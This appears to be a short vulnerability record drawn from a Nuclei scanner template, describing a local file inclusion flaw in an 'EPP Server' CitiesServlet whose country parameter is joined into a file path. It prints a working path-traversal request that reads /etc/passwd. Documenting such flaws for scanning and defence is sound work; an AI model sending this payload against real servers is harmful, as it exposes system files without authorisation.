# Vulnerability: EPP Server - Local File Inclusion
**Classification:** EPP
**Source:** Nuclei Template (`epp-server-lfi.yaml`)

## Description
servlet called "CitiesServlet" that handles HTTP GET requests, so the user-provided input, obtained from the country parameter, is directly concatenated with the "/cities/cities_" string to form the fileName, This means an attacker can manipulate the country parameter and potentially access arbitrary files on the server's file system

## Vulnerable Code Pattern / Exploit Payload
```http
GET {{BaseURL}}/cities?country=/../../../../../../../../etc/passwd
```

